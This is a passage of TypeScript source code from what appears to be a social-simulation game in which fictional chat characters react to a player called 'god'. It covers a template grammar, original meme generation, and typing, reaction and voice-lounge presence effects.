    for (const m of crew) notify(s, m.t, "mention", `New message from @${c.username}: "${m.text.slice(0, 60)}"`, `lounge:dm:${god.channelId}`);
    (c.godContacts ??= []).push({ t: now, kind: "dm", text: p.quote, where: "DMs" });
    return crew.length;
  }
  const rng = rngFor(s.seed, "dm", god.id);
  const first = !(c.godContacts ?? []).some((g) => g.kind === "dm");
  const awake = diurnal(c, now) > 0.35;
  const cmd = parseCommand(god.text);
  let t = now + (awake ? rng.range(1.5, 4) * SEC : rng.range(15, 60) * SEC);
  const sl = slotsFor(rng, s, c, undefined, { q: p.quote, Q: p.quote.toUpperCase(), kw: p.keywords[0] ?? "that", holding: s.player.holdings[0]?.name ?? "the empire", coin: p.coin ?? "GOD", ch: "dm", server: "DMs", user: c.username, past: pastGodLine(s, rng, god.id).text, pastwhere: "DMs", mem: c.memory[0]?.label ?? "that day", nw: fmtMoney(netWorth(s)), here: "DMs" });
  const out: Message[] = [];
  const n = rng.int(1, fanish(ob) ? 3 : 2);
  for (let i = 0; i < n; i++) {
    // one-on-one: drop crowd lines ("everyone shut up he asked...") that only make sense in a server
    const one = (l: string) => !CROWD.test(l);
    const pool = (i === 0 && first ? DM_REPLY[ob] : TO_GOD[p.intent]).filter(one).map((l) => l.replace(/@god\b[,!]*\s*/gi, ""));
    const bank = i === 0 && cmd ? COMMAND_BANK[cmd.kind] : pool.length ? pool : DM_REPLY[ob];
    if (i === 0 && cmd?.kind === "roast") sl.target = cmd.target ?? "that guy";
    const text = line(s, rng, c, bank, sl).replace(/@god\b[,!]*\s*/gi, "").replace(/^\s+/, "") || "hm";
    const dmm = dmMsg(s, god.channelId, c.id, text, t, i === 0 ? Math.max(now + 400, t - rng.range(2, 5) * SEC) : undefined);
    if (i === 0 && cmd?.kind === "meme") dmm.meme = memeFor(s, rng, c, undefined, god.text);
    out.push(dmm);
    t += rng.range(2, 9) * SEC;
  }
  s.pending.push(...out);
  for (const m of out) notify(s, m.t, "mention", `New message from @${c.username}: "${m.text.slice(0, 60)}"`, `lounge:dm:${god.channelId}`);
  c.bond = clamp((c.bond ?? 0) + 6, 0, 100);
  c.opinion = clamp(c.opinion + (negish(ob) ? 3 : 2), -100, 100);
  (c.godContacts ??= []).push({ t: now, kind: "dm", text: p.quote, where: "DMs" });
  if (c.godContacts.length > 10) c.godContacts.shift();
  return out.length;
}

/** two characters DM each other (often about god). @god can read everything. */
export function ambientDm(s: WorldState, rng: Rng, t: number) {
  const pool = s.characters.filter((c) => c.core && c.friends.length);
  if (!pool.length) return;
  const a = rng.weighted(pool, (c) => diurnal(c, t));
  const b = charById(s, rng.pick(a.friends));
  const chId = dmChannel(a.id, b.id);
  const { srv, ch } = DM_SERVER([a.id, b.id], chId);
  const tp = s.topics.filter((x) => x.about === "god" && x.heat > 1);
  runEpisode(s, rng, srv, ch, t, tp.length && rng.chance(0.6) ? rng.pick(tp) : undefined, { starter: a, minLen: 2 });
}

// ---------------------------------------------------------------- bus handlers
export function handleBus(s: WorldState, ev: BusEvent) {
  const rng = rngFor(s.seed, "bus", ev.id);
  const topic = s.topics.find((x) => x.id === ev.topicId);
  if (ev.kind === "echo") {
    const srv = s.servers.find((x) => x.id === ev.data.server), from = s.servers.find((x) => x.id === ev.data.from);
    if (!srv || !from) return;
    const fromCh = from.channels.find((c) => c.id === ev.data.ch);
    const chs = srv.channels.filter((c) => !c.announce);
    const ch = chs.find((c) => c.tags.includes("god")) ?? chs.find((c) => c.name === "general") ?? chs[0];
    const fake: Message = { id: String(ev.data.god), serverId: from.id, channelId: String(ev.data.ch), authorId: "god", text: String(ev.data.q), t: ev.t, reactions: [], kind: "chat", score: 0 };
    const p = parseGodText(String(ev.data.q));
    const x: Ctx = { s, rng, srv, ch, god: fake, p, now: ev.t, topic: topic ?? ({ id: "", tag: "", label: "", about: "god", category: "chat", valence: 0, magnitude: 1, heat: 1, startedAt: ev.t, facts: {} } as Topic) };
    const sl = (c: Character, u?: Character) => slots(x, c, u, { server: from.name, ch: fromCh?.name ?? "general", here: srv.name });
    const b = new Burst(x, ev.t);
    const opener = audience(x, (o) => (fanish(o) ? 3 : negish(o) ? 2 : 1), new Set(), ev.t);
    if (!opener) return;
    const o1 = b.push(opener, line(s, rng, opener, ECHO_OPEN, sl(opener)), { intent: "echo" });
    o1.typingFrom = ev.t - 3000;
    for (let i = 0, n = rng.int(2, 6); i < n; i++) {
      const c = audience(x, () => 1, new Set([opener.id]), b.cur);
      if (!c) break;
      b.push(c, line(s, rng, c, ECHO_REPLY, sl(c, opener)), { replyTo: rng.chance(0.4) ? o1.id : undefined, intent: "echoReply", gap: [2 * SEC, 14 * SEC] });
    }
    s.pending.push(...b.msgs);
    return;
  }
  if (ev.kind === "screenshot") {
    const from = s.servers.find((x) => x.id === ev.data.from);
    const ch = from?.channels.find((c) => c.id === ev.data.ch);
    const authors = s.characters.filter((c) => c.influencer && (fanish(obsessionOf(c)) || c.stance === "memer"));
    if (!from || !ch || !authors.length) return;
    const author = rng.pick(authors);
    const text = expand(rng.pick([
      "god just said \"{q}\" in {server} #{ch} 😭", "screenshot from {server} today. he said \"{q}\" and the whole server combusted", "{n} people replied to god in {server} in under a minute. normal behavior",
      "POV: god says \"{q}\" and your whole server forgets how to act", "the {server} chat after god typed \"{q}\" >>>", "not god casually saying \"{q}\" in #{ch}",
    ]), { q: String(ev.data.q), server: from.name, ch: ch.name, n: String(Math.max(3, Number(ev.data.replies) || 3)) }, rng);
    const e = engagementFor(rng, author, topic?.heat ?? 4);
    const post: Post = { id: nid(s, "p"), platform: "chirp", authorId: author.id, text: `${text}${topic ? ` #${topic.tag}` : ""}`, t: ev.t, topicId: topic?.id, ...e, replies: 0, media: { hue: 42, label: `${from.name} #${ch.name}`, kind: "photo" }, score: 3 };
    s.posts.push(post);
    s.stats.posts++;
    // real replies under it (count backed by stored replies)
    for (let i = 0, n = rng.int(2, 5); i < n; i++) {
      const r = makePost(s, rng, ev.t + rng.range(20, 600) * SEC, { topic: topic ?? null, platform: "chirp", replyToId: post.id });
      void r;
    }
    if (topic) { topic.heat += 2; }
    return;
  }
  if (ev.kind === "godDm") {
    const c = charById(s, String(ev.data.who));
    const from = s.servers.find((x) => x.id === ev.data.from);
    const ch = from?.channels.find((x) => x.id === ev.data.ch);
    if (!c || !from || !ch) return;
    const chId = dmChannel("god", c.id);
    const ob = obsessionOf(c);
    const sl = slotsFor(rng, s, c, undefined, { server: from.name, ch: ch.name, holding: s.player.holdings[0]?.name ?? "your empire" });
    const text = line(s, rng, c, DM_OPEN[ob], sl);
    const m = dmMsg(s, chId, c.id, text, ev.t);
    s.pending.push(m);
    if (rng.chance(0.4)) s.pending.push(dmMsg(s, chId, c.id, line(s, rng, c, ["no pressure to reply", "ok that's all 🙏", "sorry if this is weird", "anyway have a good one"], sl), ev.t + rng.range(4, 20) * SEC));
    notify(s, ev.t, "mention", `New message from @${c.username}: "${text.slice(0, 60)}"`, `lounge:dm:${chId}`);
    return;
  }
  if (ev.kind === "followup" && topic) {
    // the day-after discourse for big god actions: more servers, a meme, maybe an opinion piece
    const srvs = rng.shuffle(s.servers.slice()).slice(0, rng.int(2, 4));
    for (const srv of srvs) {
      const chs = srv.channels.filter((c) => !c.announce);
      runEpisode(s, rng, srv, rng.pick(chs), ev.t + rng.range(0, 8) * MIN, topic, { mode: "reaction" });
    }
    const memers = s.characters.filter((c) => c.stance === "memer" && c.influencer);
    if (memers.length) {
      const p = makePost(s, rng, ev.t + rng.range(1, 10) * MIN, { topic, author: rng.pick(memers), platform: "chirp" });
      p.media = { hue: rng.int(0, 360), label: topic.tag, kind: "meme", meme: memeFor(s, rngFor(s.seed, "pm", p.id), charById(s, p.authorId), topic) };
    }
    if (topic.magnitude >= 5 && rng.chance(0.6)) makeArticle(s, rng, topic, ev.t + rng.range(5, 30) * MIN, "opinion");
    topic.heat += topic.magnitude * 0.8;
  }
}

/** used by the template generator for god talk when god isn't around */
export function ambientLine(s: WorldState, rng: Rng, c: Character): string {
  const ob = obsessionOf(c);
  const past = pastGodLine(s, rng);
  const sl = slotsFor(rng, s, c, undefined, { past: past.text, pastwhere: past.where, n: String(rng.int(2, 40)), nw: fmtMoney(netWorth(s)), holding: s.player.holdings.length ? rng.pick(s.player.holdings).name : "the empire" });
  return expand(rng.pick(AMBIENT[ob]), sl, rng);
}

export { AMBIENT };

```

## src/lib/sim/grammar.ts
```ts
import type { Rng } from "./rng";

export type Slots = Record<string, string | (() => string) | undefined>;

/**
 * Tiny template grammar:
 *  {a|b|c}   → random alternative (may nest slots)
 *  {slot}    → slot value (string or thunk); unknown slots are dropped
 *  {?text}   → included with 50% probability
 */
export function expand(tpl: string, slots: Slots, rng: Rng): string {
  let s = tpl;
  for (let guard = 0; guard < 24; guard++) {
    const m = /\{([^{}]*)\}/.exec(s);
    if (!m) break;
    const body = m[1];
    let rep: string;
    if (body.startsWith("?")) rep = rng.chance(0.5) ? body.slice(1) : "";
    else if (body.includes("|")) rep = rng.pick(body.split("|"));
    else {
      const v = slots[body];
      rep = typeof v === "function" ? v() : v ?? "";
    }
    s = s.slice(0, m.index) + rep + s.slice(m.index + m[0].length);
  }
  return s
    .replace(/\b(the|a) (the|a|an) /gi, "$2 ")
    .replace(/\s+([,.!?])/g, "$1")
    .replace(/\s{2,}/g, " ")
    .trim();
}

```

## src/lib/sim/memes.ts
```ts
/** Original meme formats (no third-party templates, no real people). A meme is data; MemeImage renders it as SVG. */
import type { Rng } from "./rng";

export type MemeFormat = "caption" | "compare" | "pov" | "chart" | "chirpshot" | "reaction" | "starter" | "leakdoc";

export interface MemeSpec {
  f: MemeFormat;
  hue: number;
  seed: number;
  top?: string;
  bottom?: string;
  a?: string; // left / first label
  b?: string; // right / second label
  art?: string; // emoji "actor"
  art2?: string;
  arts?: string[]; // starter pack items
  trend?: "up" | "down" | "spike" | "crash";
  doc?: { title: string; lines: string[]; stamp: string; by: string }; // fabricated in-world "leaked" doc (storyline flavor)
  shot?: { name: string; handle: string; text: string; likes: number; seed: number; pfp?: string; gold?: boolean };
}

export interface MemeCtx {
  q?: string; // what god said (short)
  topic?: string; // topic label e.g. "the island purchase"
  tag?: string;
  mood: "fan" | "hater" | "neutral";
  shot?: MemeSpec["shot"];
}

const short = (s: string | undefined, n: number) => {
  const t = (s ?? "").replace(/\s+/g, " ").trim();
  return t.length > n ? t.slice(0, n - 1).trimEnd() + "…" : t;
};

const FACES = { fan: ["🤩", "😭", "🥹", "😍", "🙌", "🫡"], hater: ["😒", "🙄", "🤨", "😐", "🥱", "🤡"], neutral: ["😳", "👀", "🤔", "😶", "🫠", "💀"] };
const GOD = ["👑", "🐐", "💎", "🛸", "🦁", "🏆"];

type Fill = (r: Rng, c: Required<Pick<MemeCtx, "q" | "topic">> & MemeCtx) => Omit<MemeSpec, "hue" | "seed">;

const BANK: Record<MemeCtx["mood"], Fill[]> = {
  fan: [
    (r, c) => ({ f: "caption", top: "nobody:", bottom: `god at 3am: "${c.q}"`, art: r.pick(GOD) }),
    (r, c) => ({ f: "reaction", top: `me when god says "${c.q}"`, art: r.pick(FACES.fan) }),
    (r, c) => ({ f: "compare", a: "normal people saying it", b: `god saying "${c.q}"`, art: "🙂", art2: r.pick(GOD) }),
    (r, c) => ({ f: "pov", top: `POV: god just typed "${c.q}" and you were online`, art: r.pick(["🫨", "😱", "🥹"]) }),
    (r) => ({ f: "chart", top: "server activity", a: "before god", b: "after god", trend: "spike", art: r.pick(GOD) }),
    (r, c) => ({ f: "chart", top: "god's aura", a: "last week", b: short(c.topic, 22), trend: "up", art: "📈" }),
    (r, c) => ({ f: "starter", top: `${short(c.topic, 26)} starter pack`, arts: r.shuffle(["👑", "💸", "🛥️", "🕶️", "📈", "🏝️", "⌚", "🍾"]).slice(0, 4) }),
    (r, c) => ({ f: "caption", top: "me refreshing the chat", bottom: `waiting for god to say something after "${short(c.q, 24)}"`, art: "🔄" }),
  ],
  hater: [
    (r, c) => ({ f: "caption", top: "god fans when he says", bottom: `"${c.q}" 💀`, art: r.pick(["🤡", "🧎", "🫠"]) }),
    (r, c) => ({ f: "compare", a: "what god fans see", b: "what actually happened", art: "🏰", art2: "🏚️", top: short(c.topic, 30) }),
    (r) => ({ f: "chart", top: "god hype vs reality", a: "hype", b: "reality", trend: "crash", art: "📉" }),
    (r, c) => ({ f: "reaction", top: `me reading "${c.q}" for the 40th time today`, art: r.pick(FACES.hater) }),
    (r, c) => ({ f: "pov", top: `POV: you said god was mid and now the whole server is typing`, art: "🫣", bottom: short(c.topic, 30) }),
  ],
  neutral: [
    (r, c) => ({ f: "reaction", top: `me finding out about ${short(c.topic, 36)}`, art: r.pick(FACES.neutral) }),
    (r, c) => ({ f: "pov", top: `POV: you open the app and it's all ${short(c.topic, 30)}`, art: r.pick(["🫠", "😶", "📱"]) }),
    (r, c) => ({ f: "compare", a: "me before checking the chat", b: "me after", art: "😌", art2: "😵‍💫", top: short(c.topic, 30) }),
    (r, c) => ({ f: "caption", top: `everyone talking about ${short(c.topic, 30)}`, bottom: "me who just woke up", art: "🥱" }),
    (r) => ({ f: "chart", top: "my screen time", a: "monday", b: "today", trend: "up", art: "📱" }),
  ],
};

/** Pick and fill an original meme for the current context. */
export function makeMeme(rng: Rng, ctx: MemeCtx): MemeSpec {
  const c = { ...ctx, q: short(ctx.q || "sup guys", 42), topic: short(ctx.topic || "whatever this is", 40) };
  const base = { hue: rng.int(0, 360), seed: rng.int(1, 1e6) };
  if (ctx.shot && rng.chance(0.5)) {
    return { ...base, f: "chirpshot", shot: { ...ctx.shot, text: short(ctx.shot.text, 140) }, top: ctx.mood === "hater" ? rng.pick(["screenshotting this before he deletes it", "receipts 📸", "this aged well"]) : rng.pick(["framing this", "saving this forever", "historic moment"]) };
  }
  const fill = rng.pick(BANK[ctx.mood]);
  return { ...base, ...fill(rng, c) };
}

/** what people type when posting a meme */
export const MEME_LINES = ["made this", "💀💀💀", "accurate", "lmaooo", "i'm done", "had to", "this is so real", "ok last one i swear", "😭😭", "be honest this is us", "posting this before someone else does", "no context needed"];

/** plain-text description for screen readers */
export function memeAlt(m: MemeSpec): string {
  const parts = [m.top, m.a && m.b ? `${m.a} vs ${m.b}` : m.a, m.bottom, m.shot ? `post by ${m.shot.name}: ${m.shot.text}` : "", m.doc ? `fake leaked document "${m.doc.title}", stamped ${m.doc.stamp}` : ""].filter(Boolean);
  return `${m.f === "leakdoc" ? "Image" : "Meme"}: ${parts.join(". ")}`;
}

```

## src/lib/sim/presence.ts
```ts
/**
 * God's presence: the world notices him typing, reacting, @-ing people and hopping into a (fictional) voice lounge.
 * All reactions are queued into s.pending with typing indicators first, so they play out in real time.
 */
import { rngFor, type Rng } from "./rng";
import type { Character, Message, Obsession, Server, WorldState } from "./types";
import { charById } from "./world";
import { clamp, diurnal, nid } from "./engine";
import { obsessionOf } from "./social";
import { line } from "./godspeak";
import { slotsFor } from "./generator";
import type { Slots } from "./grammar";

const SEC = 1000, MIN = 60_000;
const fanish = (o: Obsession) => o === "obsessed" || o === "supporter";
const negish = (o: Obsession) => o === "hater" || o === "rival";

export const TYPING_DEBOUNCE = 25 * SEC;

const B = {
  typingFan: ["omg he's typing", "EVERYBODY SHUT UP", "he's online 😭", "act normal", "HE'S TYPING", "guys guys guys he's typing", "shhh he's typing", "nobody say anything weird", "the dots. THE DOTS", "brb screenshotting the typing indicator", "he's typing in {ch} 😭", "pls be about me pls be about me"],
  typingNeg: ["oh no he's typing", "here we go", "brace for the essay", "he's typing again. pray for us", "can't wait to be disappointed", "typing... deleting... typing..."],
  typingMid: ["is god typing?", "he's typing for a while. drafting an essay?", "wait who's typing", "👀 the dots", "ok someone's typing and it's not one of us"],
  typingChain: ["ACT NORMAL", "you act normal", "SHUT UP HE'LL SEE", "too late he saw that", "why are we whispering", "fix your hair"],
  reactFan: ["GOD REACTED TO ME 😭😭", "HE REACTED {emoji} TO MY MESSAGE", "screenshotting this. framing it.", "i'm never deleting this message", "i can die happy now", "WAIT. {emoji}. FROM HIM??", "this is going on my resume", "MOM COME HERE", "no way. NO WAY.", "i'm shaking. he saw my message"],
  reactNeg: ["he reacted {emoji} to me. whatever.", "oh so now you notice me", "{emoji}?? that's it?", "not me getting a {emoji} from him. (screenshotted)", "fine. i'll take it. reluctantly.", "great now his fans are in my mentions"],
  reactMid: ["oh. he reacted. {emoji}", "huh. god reacted to me", "didn't expect that tbh", "cool cool cool. normal day."],
  reactOthers: ["HE REACTED TO {user} 😭", "{user} is famous now", "screenshot this", "why does {user} get a {emoji} and not me", "{user} we need a speech", "the {emoji} is canon now", "{user} you're never living this down", "i'd frame that tbh", "react to mine next pls 🙏", "it's the {emoji} for me"],
  reactOthersNeg: ["imagine being reacted to by him", "{user} is gonna be insufferable now", "lol {user} is shaking", "a {emoji}. wow. history."],
  addressed: ["omg hi. you said '{q}'? ok yes", "you're talking to ME? about '{q}'?", "yes god? '{q}'? i'm listening", "ok so about '{q}'", "wait you @'d me 😭 '{q}' huh", "hi!! '{q}' is so real"],
  addressedNeg: ["oh. you @'d me. '{q}'? bold.", "'{q}'. ok and?", "why are you pinging me about '{q}'"],
  watchers: ["he's talking to {user} 😭", "{user} got the ping 😭", "god just @'d {user}", "{user} answer him!!", "we're all watching {user}", "{user} don't fumble this"],
  cmdHi: ["HI EVERYONE. god told me to say hi. so. hi 👋", "hi!! 👋 (god made me do it)", "hello chat. hello god. hello world 👋", "hi 👋 i'm doing it, i'm saying hi"],
  cmdJoke: ["ok joke: why did the billionaire bring a ladder to {here}? to reach new followers. i'll see myself out", "joke: god walks into a bar. buys the bar. that's the joke.", "what's god's favorite exercise? running the internet 😂", "why don't jets ever get lost? they always follow the money 💀", "knock knock. who's there. not my rent money"],
  cmdMeme: ["fresh meme for the boss 👑", "made this in 4 seconds for you god", "meme delivery 📦", "you asked. i delivered."],
  cmdDefend: ["leave god ALONE. he said so himself.", "anyone saying anything about god has to go through me first", "defending the boss. come at me.", "god has done nothing wrong (today). bye.", "say it to MY face, not his"],
  cmdRoast: ["{target}? your takes have a loading screen 💀", "{target} still uses the default pfp energy", "{target}, even your alt accounts mute you", "{target} types like their keyboard owes them money", "{target}'s group chat has a {target}-free version"],
  cmdRoastBack: ["wow ok. sent by HIM?? 😭", "i'm not even mad. god sent this. it's an honor.", "ok that's fair actually", "this is targeted harassment (i love it)"],
  cmdGeneric: ["on it boss", "say less", "ok ok i'll try: '{q}'", "doing it right now", "anything for you god"],
  voiceChat: ["HE JOINED VC", "GOD IS IN VOICE RUN", "NO WAY 😭 joining", "who's in vc rn??", "HE'S IN THE VOICE LOUNGE", "everybody unmute", "my mic is so bad rn noooo", "joining joining joining", "i'm too nervous to join"],
  voiceNeg: ["oh great he's in vc", "not joining. (joining)", "he's gonna make it weird"],
  voiceLeave: ["he left 😭", "it was the dog barking wasn't it", "come back 😭", "who scared him off", "that was the best 4 minutes of my life", "ok that was cool"],
  overheard: ["wait is that actually him", "say something god", "can you hear me?? can he hear me??", "someone's dog is barking", "okay okay act normal", "he breathed. HE BREATHED", "*everyone unmutes at once*", "god what's your favorite color (gold obviously)", "who's eating chips on mic", "i'm recording this in my heart", "my mom just walked in 😭", "is your mic on? oh it is. hi", "ok who's doing the echo", "god do you sleep", "this is the best vc ever", "can you say my name", "someone mute the kid", "lag lag lag", "he laughed. i made god laugh", "*keyboard noises*", "ok i'm crying a little", "brb grabbing a drink"],
};
export const PRESENCE_LINES = B;

function pickPeople(s: WorldState, rng: Rng, srv: Server, n: number, t: number, w: (o: Obsession) => number, exclude = new Set<string>()): Character[] {
  const out: Character[] = [];
  const pool = srv.members.filter((id) => !exclude.has(id));
  for (let i = 0; i < n && pool.length; i++) {
    const id = rng.weighted(pool, (id) => { const c = charById(s, id); return w(obsessionOf(c)) * (0.3 + diurnal(c, t)) * Math.sqrt(c.activity) * (c.core ? 2.5 : 1) * (1 + (c.bond ?? 0) / 40); });
    pool.splice(pool.indexOf(id), 1);
    out.push(charById(s, id));
  }
  return out;
}

function msg(s: WorldState, c: Character, serverId: string, channelId: string, text: string, t: number, typingFrom: number, extra: Partial<Message> = {}): Message {
  const m: Message = { id: nid(s, "m"), serverId, channelId, authorId: c.id, text, t: Math.round(t), typingFrom: Math.round(Math.min(typingFrom, t - 300)), reactions: [], kind: "chat", score: 2, ...extra, mentionsGod: /@god\b/i.test(text) || undefined };
  s.pending.push(m);
  s.stats.messages++;
  c.postCount++;
  return m;
}
const sl = (s: WorldState, rng: Rng, c: Character, extra: Slots = {}) => slotsFor(rng, s, c, undefined, extra);
function moment(s: WorldState, m: NonNullable<WorldState["godMoments"]>[number]) {
  (s.godMoments ??= []).push(m);
  if (s.godMoments.length > 80) s.godMoments.splice(0, s.godMoments.length - 80);
}
const chatChannel = (srv: Server) => srv.channels.find((c) => !c.announce && /general|lobby|chat/.test(c.name)) ?? srv.channels.find((c) => !c.announce) ?? srv.channels[0];

// ---------------------------------------------------------------- typing presence
/** god focused the composer / pressed the first key. Debounced per channel. Returns how many reactions were queued. */
export function godTyping(s: WorldState, serverId: string, channelId: string, now: number): number {
  if (serverId === "dm") return 0;
  const srv = s.servers.find((x) => x.id === serverId), ch = srv?.channels.find((c) => c.id === channelId);
  if (!srv || !ch || ch.announce) return 0;
  const last = [...(s.godMoments ?? [])].reverse().find((g) => g.kind === "typing" && g.link === `lounge:${serverId}:${channelId}`);
  if (last && now - last.t < TYPING_DEBOUNCE) return 0;
  const rng = rngFor(s.seed, "typing", channelId, Math.floor(now / 1000));
  const n = rng.int(3, 5);
  const people = pickPeople(s, rng, srv, n, now, (o) => ({ obsessed: 6, supporter: 3.5, business: 1, skeptic: 1, rival: 1, hater: 1.2, indifferent: 0.4 })[o]);
  const out: Message[] = [];
  let t = now + rng.range(0.9, 1.4) * SEC;
  people.forEach((c, i) => {
    const o = obsessionOf(c);
    const chain = i === 1 && out[0] && rng.chance(0.55);
    const bank = chain ? B.typingChain : fanish(o) ? B.typingFan : negish(o) ? B.typingNeg : B.typingMid;
    const text = line(s, rng, c, bank, sl(s, rng, c, { ch: `#${ch.name}` }));
    out.push(msg(s, c, srv.id, ch.id, text, t, now + rng.range(0.15, 0.6) * SEC, { intent: "godTyping", replyTo: chain ? out[0].id : undefined }));
    t += rng.range(0.4, 1.6) * SEC;
  });
  moment(s, { t: now, kind: "typing", text: `You started typing in ${srv.name} #${ch.name}. ${out.length} people noticed`, link: `lounge:${serverId}:${channelId}` });
  return out.length;
}

/** god sent or cleared the composer: unsent "he's typing" chatter stops. */
export function godStopTyping(s: WorldState, channelId: string, now: number) {
  s.pending = s.pending.filter((m) => !(m.channelId === channelId && m.intent === "godTyping" && m.t > now + 400));
}

// ---------------------------------------------------------------- reaction cascade
export function reactCascade(s: WorldState, m: Message, emoji: string, now: number): number {
  if (!m.authorId.startsWith("c") || m.cascaded) return 0;
  m.cascaded = true;
  const c = charById(s, m.authorId);
  const o = obsessionOf(c);
  const rng = rngFor(s.seed, "cascade", m.id, emoji);
  const extra = { emoji, user: c.username };
  const intensity = o === "obsessed" ? 3 : o === "supporter" ? 2 : negish(o) ? 1.2 : 1;
  const bank = fanish(o) ? B.reactFan : negish(o) ? B.reactNeg : B.reactMid;
  const t0 = now + rng.range(1.1, 2.2) * SEC;
  const first = msg(s, c, m.serverId, m.channelId, line(s, rng, c, bank, sl(s, rng, c, extra)), t0, now + rng.range(0.3, 0.7) * SEC, { replyTo: m.id, intent: "reacted" });
  if (intensity >= 2) msg(s, c, m.serverId, m.channelId, line(s, rng, c, bank, sl(s, rng, c, extra)), t0 + rng.range(1, 2.5) * SEC, t0 + 200, { intent: "reacted" });
  let n = 1;
  const srv = s.servers.find((x) => x.id === m.serverId);
  if (srv) {
    const others = pickPeople(s, rng, srv, Math.round(rng.range(2, 4) * intensity), now, (x) => (fanish(x) ? 3 : negish(x) ? 1.4 : 1), new Set([c.id]));
    let t = t0 + rng.range(0.6, 1.5) * SEC;
    for (const x of others) {
      const ob = obsessionOf(x);
      msg(s, x, m.serverId, m.channelId, line(s, rng, x, negish(ob) ? B.reactOthersNeg : B.reactOthers, sl(s, rng, x, extra)), t, t - rng.range(1.2, 2.6) * SEC, { replyTo: rng.chance(0.4) ? first.id : undefined, intent: "pileOn" });
      t += rng.range(0.7, 2.4) * SEC;
      n++;
    }
    // the message gets a burst of reactions, mostly copying god's emoji
    const burst = Math.round(rng.range(5, 12) * intensity);
    for (let i = 0; i < burst; i++) (m.reactionLog ??= []).push([rng.chance(0.65) ? emoji : rng.pick(["😭", "👑", "🔥", "💀", "🙏"]), Math.round(now + rng.range(0.6, 25) * SEC), rng.pick(srv.members)]);
    m.reactionLog?.sort((a, b) => a[1] - b[1]);
    for (const id of others.map((x) => x.id)) { const x = charById(s, id); if (fanish(obsessionOf(x))) x.bond = clamp((x.bond ?? 0) + 1, 0, 100); }
  }
  c.bond = clamp((c.bond ?? 0) + 8, 0, 100);
  c.opinion = clamp(c.opinion + (negish(o) ? 4 : 3), -100, 100);
  c.memory.push({ topicId: m.topicId ?? "", label: `the time god reacted ${emoji} to me`, t: now, feeling: 0.8 });
  if (c.memory.length > 12) c.memory.shift();
  (c.godContacts ??= []).push({ t: now, kind: "saw", text: `reacted ${emoji}`, where: srv ? srv.name : "DMs" });
  if (c.godContacts.length > 10) c.godContacts.shift();
  moment(s, { t: now, kind: "react", text: `You reacted ${emoji} to @${c.username}. ${n} people lost it`, link: m.serverId === "dm" ? `lounge:dm:${m.channelId}` : `lounge:${m.serverId}:${m.channelId}` });
  return n;
}

// ---------------------------------------------------------------- soft in-world commands
export type Command = { kind: "hi" | "joke" | "meme" | "defend" | "roast" | "generic"; target?: string };
export function parseCommand(text: string): Command | undefined {
  const t = text.toLowerCase();
  if (/\b(say|tell everyone) (hi|hello|hey)\b/.test(t)) return { kind: "hi" };
  if (/\b(tell|say|got) (me |us )?(a |another )?joke\b/.test(t)) return { kind: "joke" };
  if (/\b(drop|send|post|make|show) (me |us )?(a |another )?meme\b/.test(t)) return { kind: "meme" };
  if (/\bdefend me\b|\bback me up\b|\bhave my back\b/.test(t)) return { kind: "defend" };
  const r = /\broast (@?[\w.]+)/.exec(t);
  if (r) return { kind: "roast", target: r[1].replace(/^@/, "") };
  if (/^@[\w.]+,? (please |pls )?(do|go|say|sing|dance|hype|cheer|post|tell)\b/.test(t)) return { kind: "generic" };
  return undefined;
}
export const COMMAND_BANK: Record<Command["kind"], string[]> = { hi: B.cmdHi, joke: B.cmdJoke, meme: B.cmdMeme, defend: B.cmdDefend, roast: B.cmdRoast, generic: B.cmdGeneric };

/** find a character by @username among the server first, then anywhere */
export function findMentioned(s: WorldState, names: string[], srv?: Server): Character | undefined {
  for (const n of names) {
    const inSrv = srv?.members.map((id) => charById(s, id)).find((c) => c.username.toLowerCase() === n);
    if (inSrv) return inSrv;
    const any = s.characters.find((c) => c.username.toLowerCase() === n);
    if (any) return any;
  }
  return undefined;
}

// ---------------------------------------------------------------- voice lounge (fictional, no audio)
export interface VoiceChannelInfo { id: string; name: string }
export function voiceChannels(srv: Server): VoiceChannelInfo[] {
  const second = srv.vibe === "hacker" ? "the static" : srv.vibe === "finance" ? "Trading Floor" : srv.vibe === "gaming" ? "Squad Up" : "Late Night";
  return [{ id: `${srv.id}-vc-lounge`, name: "Voice Lounge" }, { id: `${srv.id}-vc-2`, name: second }];
}
export interface VoiceMember { id: string; muted: boolean; deaf: boolean; joinedAt: number; god?: boolean }
/** who's in a voice channel right now (deterministic per 10-minute slot, plus everyone who followed god in) */
export function voiceRoster(s: WorldState, srv: Server, vcId: string, now: number): VoiceMember[] {
  const slot = Math.floor(now / (10 * MIN));
  const rng = rngFor(s.seed, "vc", vcId, slot);
  const base = vcId.endsWith("lounge") ? rng.int(2, 6) : rng.int(0, 3);
  const people = pickPeople(s, rng, srv, base, now, (o) => (o === "indifferent" ? 0.6 : 1));
  const out: VoiceMember[] = people.map((c) => ({ id: c.id, muted: rng.chance(0.25), deaf: rng.chance(0.06), joinedAt: slot * 10 * MIN }));
  const g = s.voice?.god;
  if (g && g.serverId === srv.id && g.channelId === vcId && !g.leftAt) {
    out.unshift({ id: "god", muted: false, deaf: false, joinedAt: g.since, god: true });
    for (const [id, t] of g.joiners) if (t <= now && !out.some((x) => x.id === id)) out.push({ id, muted: false, deaf: false, joinedAt: t });
  }
  return out;
}

/** deterministic speaking pulse: is this member talking at `now`? */
export function speaking(id: string, now: number, god?: boolean): boolean {
  let h = 0;
  for (let i = 0; i < id.length; i++) h = (h * 31 + id.charCodeAt(i)) | 0;
  const phase = Math.floor(now / 900) + (h & 15);
  return god ? phase % 3 !== 0 : (phase * 7 + h) % 5 === 0;
}

export function godJoinVoice(s: WorldState, serverId: string, vcId: string, now: number): { joiners: number } {
  const srv = s.servers.find((x) => x.id === serverId);
  const vc = srv && voiceChannels(srv).find((v) => v.id === vcId);
  if (!srv || !vc) return { joiners: 0 };
  if (s.voice?.god && !s.voice.god.leftAt) godLeaveVoice(s, now, true);
  const rng = rngFor(s.seed, "vcjoin", vcId, Math.floor(now / 1000));
  const ch = chatChannel(srv);
  const present = new Set(voiceRoster(s, srv, vcId, now).map((x) => x.id));
  const followers = pickPeople(s, rng, srv, rng.int(5, 10), now, (o) => (fanish(o) ? 5 : negish(o) ? 0.8 : 1), present);
  const joiners: [string, number][] = followers.map((c, i) => [c.id, Math.round(now + (1.5 + i * rng.range(1.5, 4.5)) * SEC)]);
  s.voice = { lines: s.voice?.lines ?? [], god: { serverId, channelId: vcId, since: now, joiners } };
  // banner in chat + a burst of reactions and messages
  const banner: Message = { id: nid(s, "m"), serverId, channelId: ch.id, authorId: "god", text: `joined ${vc.name} 🎙️`, t: now, reactions: [], kind: "system", intent: "voiceJoin", score: 5 };
